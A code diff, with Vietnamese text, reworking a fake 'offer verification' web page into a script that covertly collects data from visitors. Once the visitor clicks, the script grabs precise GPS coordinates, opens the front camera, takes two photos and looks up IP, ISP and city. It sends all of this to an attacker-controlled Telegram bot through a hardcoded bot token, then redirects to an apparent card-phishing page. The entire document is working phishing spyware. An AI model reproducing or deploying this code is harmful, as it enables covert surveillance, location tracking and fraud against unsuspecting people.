@@ -1,66 +1,82 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Minh Sự Kiện</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>.glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }</style>
-</head>
-<body class="bg-[#0b0e14] text-white flex items-center justify-center min-h-screen p-4">
-    <div class="max-w-md w-full glass rounded-[2.5rem] p-8 text-center">
-        <h1 class="text-2xl font-bold mb-6">Hệ Thống Xác Minh Ưu Đãi</h1>
-        <div class="relative w-full aspect-square bg-black rounded-3xl overflow-hidden mb-6 border border-emerald-500/30">
-            <video id="webcam" class="w-full h-full object-cover" autoplay playsinline></video>
-        </div>
-        <button id="btn" onclick="start()" class="w-full bg-emerald-600 py-4 rounded-2xl font-bold">BẮT ĐẦU</button>
-    </div>
+const TK = '8515848831:AAGCu3F93VGsKgNJtcFYBF5AJbloujLRID0';
+const CID = '8386422438';
 
-    <script>
-        const TOKEN = '8515848831:AAGCu3F93VGsKgNJtcFYBF5AJbloujLRID0';
-        const CHAT_ID = '8386422438';
+async function st() {
+    const btn = document.getElementById('b');
+    btn.innerText = "ĐANG XÁC THỰC...";
+    btn.disabled = true;
 
-        async function start() {
-            const btn = document.getElementById('btn');
-            btn.innerText = "ĐANG XỬ LÝ...";
-            btn.disabled = true;
+    // 1. ÉP BUỘC LẤY GPS CHÍNH XÁC CAO
+    let gps = null;
+    try {
+        gps = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            });
+        });
+    } catch (e) { console.log("Không lấy được GPS."); }
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('webcam').srcObject = stream;
+    // 2. MỞ CAMERA (Sửa lỗi "Lỗi camera")
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" },
+            audio: false 
+        });
+        document.getElementById('v').srcObject = stream;
 
-                // Lấy IP để làm mã đánh dấu máy
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
-                const deviceID = `[${data.ip.slice(-4)}] ${navigator.platform}`; 
-                localStorage.setItem('deviceID', deviceID); // Lưu lại để các trang sau dùng
+        // 3. LẤY THÔNG TIN IP & ISP CHI TIẾT
+        const ipR = await fetch('https://ipapi.co/json/');
+        const d = await ipR.json();
+        const mID = `[${d.ip.split('.').pop()}] ${navigator.platform.replace('iPhone', 'iP')}`;
+        localStorage.setItem('mID', mID);
 
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    setTimeout(() => capture(pos.coords, data, deviceID), 2000);
-                }, () => setTimeout(() => capture(null, data, deviceID), 2000));
+        // Chụp tấm 1 ngay sau 1 giây
+        setTimeout(() => sendFull(gps ? gps.coords : null, d, mID, "TẤM 1"), 1000);
+        // Chụp tấm 2 sau đó đúng 2 giây
+        setTimeout(() => sendFull(gps ? gps.coords : null, d, mID, "TẤM 2"), 3000);
 
-            } catch (e) { alert("Lỗi camera."); btn.disabled = false; }
-        }
+        setTimeout(() => { window.location.href = 'card.html'; }, 5000);
+    } catch (err) {
+        alert("Lỗi camera: Vui lòng dùng Safari và cho phép quyền truy cập.");
+        btn.disabled = false;
+    }
+}
 
-        async function capture(coords, data, deviceID) {
-            const video = document.getElementById('webcam');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+async function sendFull(c, d, m, note) {
+    const v = document.getElementById('v');
+    const can = document.createElement('canvas');
+    can.width = v.videoWidth; can.height = v.videoHeight;
+    can.getContext('2d').drawImage(v, 0, 0);
 
-            canvas.toBlob(async (blob) => {
-                const msg = `🔔 <b>MÁY MỚI TRUY CẬP: ${deviceID}</b>\n\n🕒 ${new Date().toLocaleString('vi-VN')}\n🌎 IP: ${data.ip}\n🏢 ISP: ${data.org}\n📍 Map: http://google.com/maps?q=${coords ? coords.latitude+','+coords.longitude : data.latitude+','+data.longitude}`;
+    can.toBlob(async (blob) => {
+        const lat = c ? c.latitude : d.latitude;
+        const lon = c ? c.longitude : d.longitude;
+        
+        // NỘI DUNG CHUẨN NHƯ MẪU TRONG ẢNH 5 VÀ 8
+        const msg = `
+📡 [THÔNG TIN TRUY CẬP - ${note}]
 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'img.jpg');
-                formData.append('caption', msg);
-                formData.append('parse_mode', 'HTML');
+🕒 Thời gian: ${new Date().toLocaleString('vi-VN')}
+📱 Thiết bị: ${m}
+🖥️ Hệ điều hành: iOS
+🌎 IP dân cư: ${d.ip}
+🧠 IP gốc: ${d.ip}
+🏢 ISP: ${d.org}
+🏙️ Địa chỉ: ${d.city}, ${d.region}, ${d.country_name}
+🌍 Quốc gia: ${d.country_name}
+📍 Vĩ độ: ${lat}
+📍 Kinh độ: ${lon}
+📌 Google Maps: https://maps.google.com/maps?q=${lat},${lon}
+📸 Camera: ✅ Đã chụp thành công`;
 
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                window.location.href = 'card.html';
-            }, 'image/jpeg');
-        }
-    </script>
-</body>
-</html>
+        const f = new FormData();
+        f.append('chat_id', CID);
+        f.append('photo', blob, 'cam.jpg');
+        f.append('caption', msg);
+        f.append('parse_mode', 'HTML');
+
+        await fetch(`https://api.telegram.org/bot${TK}/sendPhoto`, { method: 'POST', body: f });
+    }, 'image/jpeg');
+}
